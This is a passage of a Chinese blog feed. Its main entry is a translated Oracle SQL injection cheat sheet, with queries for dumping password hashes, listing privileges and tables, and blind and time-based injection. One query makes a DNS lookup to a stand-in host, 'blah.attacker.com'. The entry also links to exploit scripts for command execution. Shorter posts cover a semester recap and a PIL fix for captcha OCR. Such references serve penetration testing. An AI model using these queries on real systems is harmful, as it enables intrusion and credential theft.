<p>大概就是以上所写的内容了，可能有所遗漏，之后想起来再补充。</p>

<p>啊对了，回学校之后还修证了一下博客的样式;D，新样式简洁多了</p>

<p>总的来说效率算中上，完成度为80%。新的学期也有新的目标，希望能够尽快成长为能够实现自己脑中所有构思的人。</p>

<p><img src="http://ww4.sinaimg.cn/mw690/7d52f1ffgw1evo7to77eaj21kw16o10g.jpg" alt="环境"/></p>

<p>2015.09.02</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Oracle注入速查表]]></title>
    <link href="http://yinzo.github.io/14608288508524.html"/>
    <updated>2016-04-17T01:47:30+08:00</updated>
    <id>http://yinzo.github.io/14608288508524.html</id>
    <content type="html"><![CDATA[
<p><small>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></small></p>

<p>注：下面的一部分查询只能由admin执行，我会在查询的末尾以&quot;<strong><code>-priv</code></strong>&ldquo;标注。</p>

<span id="more"></span><!-- more -->

<p>探测版本：</p>

<pre><code>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;  
SELECT version FROM v$instance;
</code></pre>

<p>注释：</p>

<pre><code>SELECT 1 FROM dual — comment
</code></pre>

<p><em>注: Oracle的SELECT语句必须包含FROM从句，所以当我们并不是真的准备查询一个表的时候，我们必须使用一个假的表名‘dual’</em></p>

<p>当前用户：</p>

<pre><code>SELECT user FROM dual
</code></pre>

<p>列出所有用户：</p>

<pre><code>SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$; — priv
</code></pre>

<p>列出密码哈希：</p>

<pre><code>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.  astatus能够在acct被锁定的状态下给你反馈
SELECT name,spare4 FROM sys.user$ — priv, 11g
</code></pre>

<p>密码破解：</p>

<p><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a>能够把Oracle8,9,10的基于DES的哈希破解掉</p>

<p>列出权限：</p>

<pre><code>SELECT * FROM session_privs; —当前用户的权限
SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, 列出指定用户的权限
SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, 找到拥有某个权限的用户
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;
</code></pre>

<p>列出DBA账户：</p>

<pre><code>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, 列出DBA和对应权限
</code></pre>

<p>当前数据库：</p>

<pre><code>SELECT global_name FROM global_name;
SELECT name FROM v$database;
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;
</code></pre>

<p>列出数据库：</p>

<pre><code>SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)
</code></pre>

<p>– 通过查询TNS监听程序能够查询到其他数据库.详情看<a href="http://www.jammed.com/%7Ejwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>。</p>

<p>列出字段名：</p>

<pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;
SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;
</code></pre>

<p>列出表名：</p>

<pre><code>SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
</code></pre>

<p>通过字段名找到对应表：</p>

<pre><code>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;  
</code></pre>

<p>— 注: 表名都是大写</p>

<p>查询第N行：</p>

<pre><code>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — 查询第9行(从1开始数)
</code></pre>

<p>查询第N个字符：</p>

<pre><code>SELECT substr(‘abcd’, 3, 1) FROM dual; — 得到第三个字符‘c’
</code></pre>

<p>按位与(Bitwise AND)：</p>

<pre><code>SELECT bitand(6,2) FROM dual; — 返回2
SELECT bitand(6,1) FROM dual; — 返回0
</code></pre>

<p>ASCII值转字符：</p>

<pre><code>SELECT chr(65) FROM dual; — 返回A
</code></pre>

<p>字符转ASCII码：</p>

<pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
</code></pre>

<p>类型转换：</p>

<pre><code>SELECT CAST(1 AS char) FROM dual;
SELECT CAST(’1′ AS int) FROM dual;
</code></pre>

<p>拼接字符：</p>

<pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
</code></pre>

<p>IF语句：</p>

<pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
</code></pre>

<p>— 跟SELECT语句在一起时不太管用</p>

<p>Case语句：</p>

<pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
</code></pre>

<p>绕过引号：</p>

<pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
</code></pre>

<p>延时：</p>

<pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
</code></pre>

<p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>

<p>发送DNS请求：</p>

<pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
</code></pre>

<p>命令执行：</p>

<p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>

<p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>

<p>本地文件读取：</p>

<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>

<pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
</code></pre>

<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>

<p>主机名称、IP地址：</p>

<pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
</code></pre>

<p>定位DB文件：</p>

<pre><code>SELECT name FROM V$DATAFILE;
</code></pre>

<p>默认系统和数据库：</p>

<pre><code>SYSTEM
SYSAUX
</code></pre>

<h3 id="toc_0">额外小贴士：</h3>

<p>一个字符串列出所有表名：</p>

<pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,&#39;) from all_tables 
</code></pre>

<p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>

<p>盲注排序：</p>

<pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
</code></pre>

<p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[解决Python的pytesseract库执行时报错]]></title>
    <link href="http://yinzo.github.io/14608288742293.html"/>
    <updated>2016-04-17T01:47:54+08:00</updated>
    <id>http://yinzo.github.io/14608288742293.html</id>
    <content type="html"><![CDATA[
<p>使用pytesseract库识别验证码时遇到以下报错</p>

<pre><code>AttributeError: &#39;NoneType&#39; object has no attribute &#39;bands&#39;
</code></pre>

<p>修改PIL库<code>site-packages/PIL/Image.py</code>1496行</p>

<pre><code>def split(self):
    “Split image into bands”

    if self.im.bands == 1:
</code></pre>

<p>为</p>

<pre><code>def split(self):
    “Split image into bands”
    self.load()
    if self.im.bands == 1:
</code></pre>

<p>即可。</p>

]]></content>
  </entry>
  
</feed>
